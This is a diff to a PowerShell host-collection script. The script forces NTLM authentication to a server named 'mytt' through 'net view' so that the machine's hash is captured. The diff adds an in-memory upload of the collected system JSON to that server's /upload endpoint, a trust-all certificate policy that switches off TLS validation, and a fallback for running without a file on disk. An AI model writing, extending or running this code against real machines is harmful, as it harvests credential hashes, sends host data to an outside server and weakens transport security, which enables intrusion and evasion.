@@ -10,7 +10,9 @@ catch {
 }
 
 $FormatEnumerationLimit = -1
-$currentPath=(Split-Path((Get-Variable MyInvocation -Scope 0).Value).MyCommand.Path).Trim()
+# $currentPath only needed when running from disk
+try { $currentPath=(Split-Path((Get-Variable MyInvocation -Scope 0).Value).MyCommand.Path).Trim() }
+catch { $currentPath=$env:TEMP }
 
 $MainFunction = {
     
@@ -103,11 +105,68 @@ $collectedData | Add-Member -MemberType NoteProperty -Name IP_routing -Value $ro
 $collectedData | Add-Member -MemberType NoteProperty -Name IP_routing_non_local_dst -Value $routesToNonLocalDST
 $collectedData | Add-Member -MemberType NoteProperty -Name Net_connection_profile -Value $netConnectionProfile
 
-Write-Host "Saving collected data to $currentPath\$($compSys.Name).json"
-$collectedData | ConvertTo-EnumsAsStrings | ConvertTo-Json -depth 100 | Set-Content "$currentPath\$($compSys.Name).json"
-Get-FileHash "$currentPath\$($compSys.Name).json"
-Write-Host "Hash written to $currentPath\$($compSys.Name).sha256"
-Get-FileHash "$currentPath\$($compSys.Name).json" | Set-Content "$currentPath\$($compSys.Name).sha256"
+# Convert to JSON in memory
+Write-Host "Processing JSON in memory..."
+$jsonString = $collectedData | ConvertTo-EnumsAsStrings | ConvertTo-Json -depth 100
+$fileName   = "$($compSys.Name).json"
+
+# Upload directly from memory to mCollector server
+try {
+    $serverIP = $resolved
+    if (-not $serverIP) {
+        $serverIP = (Resolve-DnsName -Name "mytt" -ErrorAction Stop | Where-Object { $_.Type -eq "A" } | Select-Object -ExpandProperty IPAddress -First 1)
+    }
+    if ($serverIP) {
+        $uploadUrl = "https://$serverIP/upload"
+        Write-Host "Uploading $fileName to $uploadUrl ..."
+
+        # Trust self-signed cert
+        Add-Type @"
+using System.Net;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+public class TrustAllCerts : ICertificatePolicy {
+    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
+}
+"@
+        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+        # Build multipart body from in-memory JSON
+        $enc = [System.Text.Encoding]::UTF8
+        $fileContent = $enc.GetBytes($jsonString)
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $ms = New-Object System.IO.MemoryStream
+        $sw = New-Object System.IO.StreamWriter($ms, $enc)
+        $sw.Write("--$boundary`r`n")
+        $sw.Write("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n")
+        $sw.Write("Content-Type: application/octet-stream`r`n`r`n")
+        $sw.Flush()
+        $ms.Write($fileContent, 0, $fileContent.Length)
+        $sw.Write("`r`n--$boundary--`r`n")
+        $sw.Flush()
+        $bodyBytes = $ms.ToArray()
+        $sw.Close()
+
+        # Send via HttpWebRequest
+        $req = [System.Net.HttpWebRequest]::Create($uploadUrl)
+        $req.Method = "POST"
+        $req.ContentType = "multipart/form-data; boundary=$boundary"
+        $req.ContentLength = $bodyBytes.Length
+        $req.Timeout = 30000
+        $reqStream = $req.GetRequestStream()
+        $reqStream.Write($bodyBytes, 0, $bodyBytes.Length)
+        $reqStream.Close()
+        $resp = $req.GetResponse()
+        $resp.Close()
+        Write-Host "Uploaded: $fileName"
+    } else {
+        Write-Host "Could not resolve server IP, skipping upload."
+    }
+} catch {
+    Write-Host "Upload failed: $($_.Exception.Message)"
+}
+
 Write-Host "All done, have fun!"
 
 }
@@ -280,11 +339,11 @@ return "Not joined."
 }
 
 function CollectNTLM {
-    Write-Host "Resolving TT to IP..."
+    Write-Host "Resolving mytt to IP..."
 
     # Try DNS resolution first
     try {
-        $resolved = Resolve-DnsName -Name "TT" -ErrorAction Stop |
+        $resolved = Resolve-DnsName -Name "mytt" -ErrorAction Stop |
                     Where-Object { $_.Type -eq "A" } |
                     Select-Object -ExpandProperty IPAddress -First 1
     }
@@ -294,10 +353,10 @@ function CollectNTLM {
     }
 
     if (-not $resolved) {
-        return "Unable to resolve TT to an IP address."
+        return "Unable to resolve mytt to an IP address."
     }
 
-    Write-Host "TT resolved to $resolved"
+    Write-Host "mytt resolved to $resolved"
     Write-Host "Collecting NTLM hash by connecting to \\$resolved..."
 
     $output = net view "\\$resolved" 2>&1
